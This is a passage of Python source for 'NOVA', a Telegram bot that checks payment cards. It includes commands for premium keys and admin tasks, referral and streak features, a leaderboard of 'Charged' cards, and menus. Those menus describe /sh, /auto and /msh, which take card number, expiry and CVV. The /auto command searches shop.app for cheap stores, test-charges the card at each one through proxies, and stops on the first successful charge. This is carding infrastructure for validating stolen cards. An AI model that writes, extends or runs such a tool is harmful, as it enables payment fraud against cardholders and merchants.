    text = pe(f"""⭐ <b>{bs('Keys generated')}</b> (x{count})
{SEP}
""" + "\n".join(f"┣ <code>{k}</code>" for k in gen) + f"""
{SEP}
📅 {bs('Valid')}: {hours_disp}
👥 {bs('Users/key')}: {max_users}
💳 {bs('CC limit')}: {cc_limit}

✅ {bs('Redeem')} <code>• /redeem KEY</code>""")
    await styled_reply(event, text)


@client.on(events.NewMessage(pattern=r'^[/.]redeem\s+'))
async def cmd_redeem(event):
    uid = event.sender_id
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    await ensure_user(uid)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /redeem NOVA_XXXX</code>"))
    key = parts[1].strip().upper()
    kd = load_keys()
    if key not in kd:
        await send_redeem_log(uid, key, "❌ Invalid Key", "not found")
        return await styled_reply(event, pe(f"❌ <b>{bs('Invalid key')}</b>"))
    entry = kd[key]; now = datetime.now()
    try:
        if now > datetime.fromisoformat(entry.get('expiry', '')):
            await send_redeem_log(uid, key, "❌ Expired", "past expiry")
            return await styled_reply(event, pe(f"❌ <b>{bs('Key expired')}</b>"))
    except Exception:
        pass
    used_by = entry.get('used_by', [])
    max_users = int(entry.get('max_users', 1))
    if uid in used_by:
        return await styled_reply(event, pe(f"❌ <b>{bs('Already used')}</b>"))
    if len(used_by) >= max_users:
        return await styled_reply(event, pe(f"❌ <b>{bs('Key max users reached')}</b>"))
    if await is_premium(uid):
        return await styled_reply(event, pe(f"❌ <b>{bs('Already premium')}</b>"))
    hours = int(entry.get('hours', DEFAULT_KEY_HOURS))
    cc_limit = int(entry.get('cc_limit', DEFAULT_KEY_CC_LIMIT))
    days = max(1, hours // 24) if hours >= 24 else 1
    await set_user_plan(uid, "Core", days)
    # Set CC limit in limits file
    lim = _read_json(USER_LIMITS_FILE, {})
    lim[str(uid)] = cc_limit
    _write_json(USER_LIMITS_FILE, lim)

    entry['used_by'] = used_by + [uid]
    entry['used_count'] = int(entry.get('used_count', 0)) + 1
    kd[key] = entry; save_keys(kd)
    hours_disp = f"{hours}h" if hours < 24 else f"{hours // 24}d"
    await send_redeem_log(uid, key, "✅ Success", f"Activated for {hours_disp}")
    await styled_reply(event, pe(
        f"🎉 <b>{bs('Premium activated')}</b>\n{SEP}\n"
        f"📅 {bs('Duration')}: <code>{hours_disp}</code>\n"
        f"💳 {bs('CC limit')}: <code>{cc_limit}</code>"))


# ====================== PREMIUM ADMIN ======================
@client.on(events.NewMessage(pattern=r'^[/.]addpremium\s+'))
async def cmd_addpremium(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /addpremium user_id [days] [cc_limit]</code>"))
    try:
        target = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    days = int(parts[2]) if len(parts) > 2 else 30
    cc = int(parts[3]) if len(parts) > 3 else 5000
    await ensure_user(target)
    await set_user_plan(target, "X", days)
    lim = _read_json(USER_LIMITS_FILE, {})
    lim[str(target)] = cc
    _write_json(USER_LIMITS_FILE, lim)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Premium added')}</b>\n👤 <code>{target}</code>\n"
        f"📅 {days}d · 💳 CC <code>{cc}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]removepremium\s+'))
async def cmd_removepremium(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /removepremium user_id</code>"))
    try:
        target = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    await set_user_plan(target, "Bronze", 0)
    await styled_reply(event, pe(f"✅ <b>{bs('Removed')}</b> <code>{target}</code>"))


# ====================== ADMIN ======================
@client.on(events.NewMessage(pattern=r'^[/.]addadmin\s+'))
async def cmd_addadmin(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /addadmin user_id</code>"))
    try:
        t = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    if t in ADMIN_ID:
        return await styled_reply(event, pe(f"💎 <b>{bs('Already admin')}</b>"))
    ADMIN_ID.append(t); _save_admins()
    await styled_reply(event, pe(f"✅ <b>{bs('Admin added')}</b> <code>{t}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]removeadmin\s+'))
async def cmd_removeadmin(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /removeadmin user_id</code>"))
    try:
        t = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    if t not in ADMIN_ID:
        return await styled_reply(event, pe(f"💎 <b>{bs('Not an admin')}</b>"))
    ADMIN_ID.remove(t); _save_admins()
    await styled_reply(event, pe(f"✅ <b>{bs('Admin removed')}</b> <code>{t}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]toggle$'))
async def cmd_toggle(event):
    if event.sender_id not in ADMIN_ID: return
    cur = get_maintenance()
    set_maintenance(not cur)
    await styled_reply(event, pe(f"💎 {bs('Maintenance')}: {'ON' if not cur else 'OFF'}"))


@client.on(events.NewMessage(pattern=r'^[/.]ping$'))
async def cmd_ping(event):
    t = time.time()
    m = await styled_reply(event, pe("🏓 ..."))
    if m:
        try:
            await m.edit(pe(f"🏓 <b>{bs('Pong')}</b> <code>{(time.time()-t)*1000:.1f}ms</code>"),
                         parse_mode='html')
        except Exception:
            pass


@client.on(events.NewMessage(pattern=r'^[/.]status$'))
async def cmd_status(event):
    if event.sender_id not in ADMIN_ID: return
    await styled_reply(event, build_status_text())


@client.on(events.NewMessage(pattern=r'^[/.]stats$'))
async def cmd_stats(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        tu = await get_total_users()
        pc = await get_premium_count()
        tc = await get_total_cards_count()
        ch = await get_charged_count()
        ap = await get_approved_count()
        ts = await get_total_sites_count()
    except Exception:
        tu = pc = tc = ch = ap = ts = 0
    refs = load_referrals()
    total_refs = sum(len(u.get("rewarded", [])) for u in refs["users"].values())
    await styled_reply(event, pe(
        f"📊 <b>{bs('Stats')}</b>\n{SEP}\n"
        f"👑 Admins: <code>{len(ADMIN_ID)}</code>\n"
        f"👥 Users: <code>{tu}</code>\n"
        f"💎 Premium: <code>{pc}</code>\n"
        f"🌐 Global sites: <code>{ts}</code>\n"
        f"🔑 Keys: <code>{len(load_keys())}</code>\n"
        f"💳 Cards logged: <code>{tc}</code>\n"
        f"🥇 Charged: <code>{ch}</code>\n"
        f"🥈 Approved: <code>{ap}</code>\n"
        f"🎁 Total refs: <code>{total_refs}</code>\n"
        f"🎯 Range: <code>${get_min_price():.2f}–${get_threshold():.2f}</code>\n"
        f"⚙️ Engine: <code>{'OK' if ENGINE_OK else 'MISSING'}</code>\n"
        f"🗄 Mongo: <code>{'OK' if mongo_db is not None else 'DOWN'}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]all\s+'))
async def cmd_all(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /all message</code>"))
    msg = parts[1]
    try:
        cursor = mongo_db["users"].find({})
        sent = 0
        async for doc in cursor:
            try:
                await send_entities(int(doc["user_id"]), pe(msg))
                sent += 1
                await asyncio.sleep(0.05)
            except Exception:
                pass
    except Exception:
        sent = 0
    await styled_reply(event, pe(f"✅ {bs('Sent to')} <code>{sent}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]setthreshold\s+'))
async def cmd_setthreshold(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /setthreshold 7</code>"))
    try:
        val = float(parts[1].strip())
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid number')}</b>"))
    set_threshold(val)
    await styled_reply(event, pe(f"✅ {bs('Max price')} <code>${val}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]setminprice\s+'))
async def cmd_setminprice(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /setminprice 0.10</code>"))
    try:
        val = float(parts[1].strip())
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid number')}</b>"))
    set_min_price(val)
    await styled_reply(event, pe(f"✅ {bs('Min price')} <code>${val}</code>"))


# ====================== USER COMMANDS ======================
@client.on(events.NewMessage(pattern=r'^[/.]ref(?:eral)?$'))
async def cmd_ref(event):
    uid = event.sender_id
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    await ensure_user(uid)
    s = referral_stats(uid)
    code = s["code"]
    try:
        me = await client_instance.get_me()
        bot_user = me.username or "YourBot"
    except Exception:
        bot_user = "YourBot"
    link = f"https://t.me/{bot_user}?start=ref_{code}"
    every = REFERRAL_MILESTONE_EVERY
    inc = s["confirmed"] % every
    bar = "▰" * inc + "▱" * (every - inc)
    text = pe(f"""🎁 <b>{bs('Referral Program')}</b>
{SEP}
🔗 <code>{link}</code>
🔑 <code>{code}</code>
{SEP}
📊 {bs('Confirmed')}: <code>{s['confirmed']}</code> · ⏳ {bs('Pending')}: <code>{s['pending']}</code>

📈 <code>{bar}</code> {inc}/{every}
🎯 {bs('Next in')}: <code>{s['next_milestone_in']}</code>

💎 <b>{bs('Reward')}</b>: <code>+{REFERRAL_MILESTONE_HOURS}h +{REFERRAL_MILESTONE_CC_LIMIT} CC</code>""")
    share_url = f"https://t.me/share/url?url={link}&text=Join%20NOVA!"
    await styled_reply(event, text, buttons=[
        [pbtn(bs("📤 Share Link"), url=share_url, style="success", icon="📤")],
        [pbtn(bs("🔙 Menu"), data="main_menu", style="danger", icon="🔙")]])


@client.on(events.NewMessage(pattern=r'^[/.]streak$'))
async def cmd_streak(event):
    uid = event.sender_id
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    s = get_streak(uid)
    cur = s["current"]; best = s["best"]
    upcoming = [d for d in sorted(STREAK_MILESTONES.keys()) if d > cur]
    if upcoming:
        target = upcoming[0]
        prev = max([d for d in STREAK_MILESTONES if d <= cur] + [0])
        span = target - prev; step = cur - prev
        bar = "▰" * max(0, step) + "▱" * max(0, span - step)
        next_str = f"{bs('Next at')} <code>{target}</code> {bs('days')}"
    else:
        bar = "▰" * 10
        next_str = f"<i>{bs('Max reached')}</i>"
    text = pe(f"""🔥 <b>{bs('Daily Streak')}</b>
{SEP}
📅 {bs('Current')}: <code>{cur}</code> {bs('days')}
🏆 {bs('Best')}: <code>{best}</code> {bs('days')}
✅ {bs('Total Checks')}: <code>{s['total_checks']}</code>

{bar}
{next_str}
{SEP}
🎁 <b>{bs('Milestones')}</b>
""" + "\n".join(f"┣ {bs('Day')} <code>{d}</code> → <code>+{h}h</code>"
                for d, h in sorted(STREAK_MILESTONES.items())))
    await styled_reply(event, text)


@client.on(events.NewMessage(pattern=r'^[/.]me$'))
async def cmd_me(event):
    uid = event.sender_id
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    await ensure_user(uid)
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{uid}", "User"
    rank = load_rank()
    charged_total = int(rank.get(str(uid), 0))
    s = get_streak(uid)
    if uid in ADMIN_ID:
        tier = f"👑 {bs('Admin')}"; exp_str = "∞"; cc_limit = 100000
    elif await is_premium(uid):
        tier = f"💎 {bs('Premium')}"
        plan = await get_user_plan(uid)
        info = await mongo_db["users"].find_one({"user_id": uid})
        cc_limit = await get_user_cc_limit(uid)
        exp = info.get("expiry") if info else None
        if exp:
            left = max(0, int((exp - datetime.utcnow()).total_seconds() / 60))
            h, m = left // 60, left % 60
            exp_str = f"{h}h {m:02d}m"
        else:
            exp_str = "∞"
    else:
        tier = f"🆓 {bs('Free')}"; exp_str = "—"; cc_limit = 0
        try:
            used = get_free_usage(uid)
            exp_str = f"{used}/{FREE_DAILY_LIMIT} " + bs("today")
        except Exception:
            pass
    try:
        rs = referral_stats(uid)
        ref_conf = rs.get("confirmed", 0); ref_pend = rs.get("pending", 0)
        ref_hours = rs.get("total_hours", 0); ref_mst = rs.get("milestones_paid", 0)
    except Exception:
        ref_conf = ref_pend = ref_hours = ref_mst = 0
    try:
        p_count = await get_proxy_count(uid)
    except Exception:
        p_count = 0
    text = pe(f"""📊 <b>{bs('My Stats')}</b>
{SEP}
👤 <b>{name}</b> (@{username})
🆔 <code>{uid}</code>
🎖️ {bs('Tier')}: {tier}
⏰ {bs('Expires')}: <code>{exp_str}</code>
💳 {bs('CC Limit')}: <code>{cc_limit}</code>
{SEP}
🔥 {bs('Streak')}: <code>{s['current']}</code> (best <code>{s['best']}</code>)
💳 {bs('Charged Total')}: <code>{charged_total}</code>
{SEP}
👥 {bs('Referrals')}: <code>{ref_conf}</code> (⏳ <code>{ref_pend}</code>)
🏅 {bs('Milestones')}: <code>{ref_mst}</code>
💰 {bs('Ref Hours')}: <code>{ref_hours}h</code>
{SEP}
🔌 {bs('Proxies')}: <code>{p_count}</code>""")
    await styled_reply(event, text)


@client.on(events.NewMessage(pattern=r'^[/.]rank$'))
async def cmd_rank(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    rank = load_rank()
    if not rank:
        return await styled_reply(event, pe(f"💎 {bs('No charged cards yet')}"))
    top = sorted(rank.items(), key=lambda x: int(x[1]), reverse=True)[:10]
    medals = ["🥇", "🥈", "🥉"]
    lines = []
    for i, (uid_str, count) in enumerate(top):
        try:
            ent = await client_instance.get_entity(int(uid_str))
            name = ent.first_name or uid_str
        except Exception:
            name = uid_str
        medal = medals[i] if i < 3 else f"<b>{i+1}.</b>"
        lines.append(f"{medal} <b>{name}</b> — <code>{count}</code>")
    await styled_reply(event, pe(f"🏆 <b>{bs('Top 10')}</b>\n{SEP}\n" + "\n".join(lines)))


# ====================== MENUS ======================
def main_menu_buttons(uid=None):
    buttons = [
        [pbtn(bs("🔓 Check"), data="gates_menu", style="success", icon="🔓"),
         pbtn(bs("🔌 Proxy"), data="proxy_menu", style="primary", icon="🔌")],
        [pbtn(bs("🎁 Referrals"), data="ref_menu", style="success", icon="🎁"),
         pbtn(bs("🏆 Rank"), data="rank_menu", style="primary", icon="🏆")],
        [pbtn(bs("📩 Support"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}",
              style="primary", icon="📩"),
         pbtn(bs("❌ Close"), data="close_menu", style="danger", icon="❌")],
    ]
    if uid and uid in ADMIN_ID:
        buttons.append([pbtn(bs("👑 Admin Panel"), data="admin_panel",
                             style="success", icon="👑")])
    return buttons


@client.on(events.NewMessage(pattern=r'^[/.]start(?:\s+(.+))?$'))
async def cmd_start(event):
    payload = (event.pattern_match.group(1) or '').strip()
    if payload.startswith('ref_'):
        ref_code = payload[4:].strip()
        try:
            if attach_referral(event.sender_id, ref_code):
                await styled_reply(event, pe(
                    f"🎁 <b>{bs('Referral Applied!')}</b>\n{SEP}\n"
                    f"✅ {bs('Joined via friend invite')}"))
        except Exception as e:
            log_system("REFERRAL", f"attach failed: {e}", "error")

    maint, joined = await asyncio.gather(
        check_maintenance(event),
        force_join_check(event),
        return_exceptions=True)
    if maint is True or joined is False:
        return

    uid = event.sender_id
    await ensure_user(uid)
    try:
        sender = await event.get_sender()
        username = sender.username or "User"
    except Exception:
        username = "User"
    if uid in ADMIN_ID:
        status_text = f"👑 {bs('Admin')}"
    elif await is_premium(uid):
        status_text = f"💎 {bs('Premium')}"
    else:
        status_text = f"🆓 {bs('Free')}"
    text = pe(f"""{SEP}
    ✨ {bs('Welcome to NOVA')} ✨
{SEP}
👤 {bs('User')}: @{username}
🆔 {bs('ID')}: <code>{uid}</code>
📊 {bs('Status')}: {status_text}
{SEP}
🔥 {bs('API-Less · Auto-search · MongoDB')} 🔥
{SEP}""")
    buttons = main_menu_buttons(uid)
    cached_fid = get_welcome_file_id()
    welcome = get_welcome_video()
    try:
        if cached_fid:
            await client_instance.send_file(event.chat_id, cached_fid,
                caption=text, buttons=buttons, supports_streaming=True)
            return
        if welcome:
            sent = await client_instance.send_file(event.chat_id, welcome,
                caption=text, buttons=buttons, supports_streaming=True)
            if sent and sent.video:
                set_welcome_file_id(sent.video.id)
            return
    except Exception:
        pass
    await styled_reply(event, text, buttons=buttons)


@client.on(events.CallbackQuery(data=b"main_menu"))
async def cb_main(event):
    await event.answer()
    uid = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
    except Exception:
        username = f"user_{uid}"
    if uid in ADMIN_ID:
        status = "👑 Admin"
    elif await is_premium(uid):
        status = "⭐ Premium"
    else:
        status = "🆓 Free"
    text = pe(f"""💎 <b>{bs('NOVA')}</b>
{SEP}
👤 @{username}
🆔 <code>{uid}</code>
📊 {status}
{SEP}
🔥 {bs('API-Less · Auto-search')}
{SEP}
{DEV_LINE}""")
    try:
        await event.edit(text, buttons=main_menu_buttons(uid),
                         parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"close_menu"))
async def cb_close(event):
    await event.answer()
    try:
        await event.delete()
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"gates_menu"))
async def cb_gates(event):
    await event.answer()
    text = pe(f"""🔓 <b>{bs('Checker')}</b>
{SEP}
<b>{bs('Single')}</b>
└─ <code>• /sh card|mm|yy|cvv</code>
<b>{bs('AUTO')}</b> (fetch + check)
└─ <code>• /auto card|mm|yy|cvv [kw]</code>
<b>{bs('Mass')}</b>
└─ <code>• /msh</code> <i>(reply .txt)</i>
{SEP}
💡 {bs('Admin')}
┣ <code>• /fetchstores 200 [kw]</code>
┣ <code>• /sites</code> · <code>• /site</code>
┗ <code>• /setthreshold 7</code>""")
    kb = [
        [pbtn("• /sh", data="sub_sh_help", style="success", icon="🛒"),
         pbtn("• /auto", data="sub_auto_help", style="primary", icon="⚡")],
        [pbtn("• /msh", data="sub_mass", style="primary", icon="📦"),
         pbtn(bs("🔌 Proxy"), data="proxy_menu", style="primary", icon="🔌")],
        [pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")],
    ]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"sub_sh_help"))
async def cb_sub_sh(event):
    await event.answer()
    text = pe(f"""🛒 <b>{bs('/sh — Single Check')}</b>
{SEP}
<b>{bs('Usage')}</b>
└─ <code>• /sh 4111...|12|30|123</code>
{SEP}
<b>{bs('Requires')}</b>
┣ 🌐 Global sites
┗ 🔌 proxies (/addproxy)""")
    try:
        await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="gates_menu",
                                              style="danger", icon="🔙")]],
                         parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"sub_auto_help"))
async def cb_sub_auto(event):
    await event.answer()
    text = pe(f"""⚡ <b>{bs('/auto — Auto Discover + Check')}</b>
{SEP}
<b>{bs('Usage')}</b>
└─ <code>• /auto 4111...|12|30|123</code>
└─ <code>• /auto 4111...|12|30|123 socks</code>
{SEP}
<b>{bs('What it does')}</b>
┣ 1. {bs('Searches shop.app')}
┣ 2. {bs('Filters by price')} <code>${get_min_price():.2f}–${get_threshold():.2f}</code>
┣ 3. {bs('Checks card vs each store')}
┗ 4. {bs('Stops on first Charged')}""")
    try:
        await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="gates_menu",
                                              style="danger", icon="🔙")]],
                         parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"sub_mass"))
async def cb_sub_mass(event):
    await event.answer()
    text = pe(f"""📦 <b>{bs('/msh — Mass Check')}</b>
{SEP}
<b>{bs('Syntax')}</b>
└─ <code>• /msh</code> <i>(reply to .txt)</i>
{SEP}
<b>{bs('Limits')}</b>
┣ 👑 <b>Admin</b>: <code>{MASS_HARD_CAP_ADMIN}</code>
┗ 💎 <b>Premium</b>: <code>{MASS_HARD_CAP_PREMIUM}</code>""")
    try:
        await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="gates_menu",
                                              style="danger", icon="🔙")]],
                         parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"proxy_menu"))
async def cb_proxy(event):
    await event.answer()
    uid = event.sender_id
    if uid not in ADMIN_ID and not await is_premium(uid):
        text = pe(f"🔌 <b>{bs('Proxy Manager')}</b>\n{SEP}\n💎 <b>{bs('Premium only')}</b>")
        try:
            await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="main_menu",
                                                  style="danger", icon="🔙")]],
                             parse_mode='html', link_preview=False)
        except Exception:
            pass
        return
    try:
        count = await get_proxy_count(uid)
    except Exception:
        count = 0
    text = pe(f"""🔌 <b>{bs('Proxy Manager')}</b>
{SEP}
📁 {bs('Saved')}: <code>{count}/{MAX_PROXIES_PER_USER}</code>
{SEP}
📥 <code>• /addproxy</code>
🔀 <code>• /proxy</code>
📂 <code>• /myproxy</code>
🗑 <code>• /clearproxy</code>""")
    try:
        await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="main_menu",
                                              style="danger", icon="🔙")]],
                         parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"ref_menu"))
async def cb_ref_menu(event):
    await event.answer()
    uid = event.sender_id
    s = referral_stats(uid)
    code = s["code"]
    try:
        me = await client_instance.get_me()
        bot_user = me.username or "YourBot"
    except Exception:
        bot_user = "YourBot"
    link = f"https://t.me/{bot_user}?start=ref_{code}"
    every = REFERRAL_MILESTONE_EVERY
    inc = s["confirmed"] % every
    bar = "▰" * inc + "▱" * (every - inc)
    text = pe(f"""🎁 <b>{bs('Referral Program')}</b>
{SEP}
🔗 <code>{link}</code>
🔑 <code>{code}</code>
{SEP}
📊 {bs('Confirmed')}: <code>{s['confirmed']}</code> · ⏳ <code>{s['pending']}</code>
📈 <code>{bar}</code> {inc}/{every}""")
    share_url = f"https://t.me/share/url?url={link}&text=Join%20NOVA!"
    try:
        await event.edit(text, buttons=[
            [pbtn(bs("📤 Share"), url=share_url, style="success", icon="📤")],
            [pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]],
            parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"rank_menu"))
async def cb_rank(event):
    await event.answer()
    rank = load_rank()
    if not rank:
        text = pe(f"🏆 <b>{bs('Top 10')}</b>\n{SEP}\n<i>{bs('Empty')}</i>")
    else:
        top = sorted(rank.items(), key=lambda x: int(x[1]), reverse=True)[:10]
        medals = ["🥇", "🥈", "🥉"]
        lines = []
        for i, (uid_s, cnt) in enumerate(top):
            try:
                ent = await client_instance.get_entity(int(uid_s))
                name = ent.first_name or uid_s
            except Exception:
                name = uid_s
            medal = medals[i] if i < 3 else f"<b>{i+1}.</b>"
            lines.append(f"{medal} <b>{name}</b> — <code>{cnt}</code>")
        text = pe(f"🏆 <b>{bs('Top 10')}</b>\n{SEP}\n" + "\n".join(lines))
    try:
        await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="main_menu",
                                              style="danger", icon="🔙")]],
                         parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"admin_panel"))
async def cb_admin(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Access denied", alert=True)
    await event.answer()
    text = pe(f"""👑 <b>{bs('Admin Panel')}</b>
{SEP}
🔍 <b>{bs('Stores')}</b>
┣ <code>/fetchstores 200 [kw]</code>
┣ <code>/sites</code> · <code>/site</code>
┣ <code>/setthreshold 7</code>
┗ <code>/setminprice 0.10</code>
{SEP}
📋 <b>{bs('Premium')}</b>
┣ <code>/addpremium uid [days] [cc]</code>
┗ <code>/removepremium uid</code>
{SEP}
🔑 <b>{bs('Keys')}</b>
┗ <code>/genkeys n h max cc [price]</code>
{SEP}
👑 <b>{bs('Admins')}</b>
┣ <code>/addadmin uid</code>
┗ <code>/removeadmin uid</code>
{SEP}
📊 <b>{bs('Bot')}</b>
┣ <code>/stats</code> · <code>/status</code> · <code>/ping</code>
┗ <code>/toggle</code> · <code>/all msg</code>""")
    try:
        await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="main_menu",
                                              style="danger", icon="🔙")]],
                         parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"check_joined"))
async def cb_check_joined(event):
    uid = event.sender_id
    _JOIN_CACHE.pop(uid, None)
    if await is_user_joined(uid):
        await event.answer("✅ Verified!", alert=True)
        try:
            await event.delete()
        except Exception:
            pass
    else:
        await event.answer("❌ Not joined yet", alert=True)


# ====================== BACKGROUND ======================
async def premium_cleanup_loop():
    while True:
        await asyncio.sleep(3600)
        try:
            now = datetime.utcnow()
            await mongo_db["users"].update_many(
                {"expiry": {"$lt": now},
                 "plan": {"$in": ["Core", "Elite", "Root", "X"]}},
                {"$set": {"plan": "Bronze", "expiry": None}}
            )
        except Exception as e:
            log_system("CLEANUP", f"{e}", "error")


# ====================== MAIN ======================
async def main():
    global client_instance
    client_instance = client

    try:
        os.makedirs(VIDEO_DIR, exist_ok=True)
    except Exception:
        pass

    _load_admins()

    log_system("BOOT", "Starting NOVA v8.1.0 (API-less + Mongo + Auto-search)...")
    log_system("BOOT", f"checkout_engine loaded: {ENGINE_OK}")
    if not ENGINE_OK:
        log_system("BOOT", f"engine error: {_ENGINE_ERR}", "error")

    try:
        await init_db()
    except Exception as e:
        log_system("BOOT", f"db init failed: {e}", "error")

    log_system("BOOT", f"admins loaded: {ADMIN_ID}")

    if not BOT_TOKEN:
        log_system("BOOT", "BOT_TOKEN not set — aborting", "error")
        return

    for path, default in [
        (KEYS_FILE, {}),
        (RANK_FILE, {}),
        (SETTINGS_FILE, {"maintenance": False, "threshold": PRICE_CEIL,
                          "min_price": PRICE_FLOOR}),
        (REFERRALS_FILE, {"users": {}, "codes": {}}),
        (STREAKS_FILE, {}),
        (PREMIUM_DAILY_FILE, {}),
        (USER_LIMITS_FILE, {}),
        (SITE_STATS_FILE, {}),
    ]:
        if not os.path.exists(path):
            _write_json(path, default)

    asyncio.create_task(premium_cleanup_loop())

    while True:
        try:
            log_system("BOOT", "Connecting...")
            await client.start(bot_token=BOT_TOKEN)
            log_system("BOOT", "✅ NOVA online.")
            me = await client.get_me()
            log_system("BOOT", f"bot=@{me.username} id={me.id}")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleep {e.seconds+5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{type(e).__name__}: {e}", "error")
            await asyncio.sleep(10)


if __name__ == "__main__":
    asyncio.run(main())